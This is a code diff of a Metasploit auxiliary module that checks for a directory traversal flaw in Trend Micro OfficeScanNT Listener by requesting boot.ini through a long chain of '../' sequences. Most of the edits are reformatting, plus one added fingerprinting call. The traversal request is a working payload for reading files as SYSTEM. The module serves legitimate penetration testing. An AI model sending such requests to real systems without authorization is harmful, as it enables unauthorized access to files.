@@ -9,9 +9,7 @@
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
-
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -23,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'        => 'TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access',
 			'Version'     => '$Revision$',
 			'Description' => %q{
-				This module tests for directory traversal vulnerability in the UpdateAgent
+					This module tests for directory traversal vulnerability in the UpdateAgent
 				function in the OfficeScanNT Listener (TmListen.exe) service in Trend Micro
 				OfficeScan. This allows remote attackers to read arbitrary files as SYSTEM
 				via dot dot sequences in an HTTP request.
@@ -40,17 +38,20 @@ class Metasploit3 < Msf::Auxiliary
 		)
 
 		register_options(
-				[
-					Opt::RPORT(26122),
-				], self.class)
+			[
+				Opt::RPORT(26122),
+			], self.class)
 	end
 
 	def run_host(target_host)
 
-		res = send_request_raw({
-			'uri'     => '/activeupdate/../../../../../../../../../../../boot.ini',
-			'method'  => 'GET',
-		}, 20)
+		res = send_request_raw(
+			{
+				'uri'     => '/activeupdate/../../../../../../../../../../../boot.ini',
+				'method'  => 'GET',
+			}, 20)
+
+		http_fingerprint({ :response => res })
 
 		if (res.code >= 200)
 			if (res.body =~ /boot/)
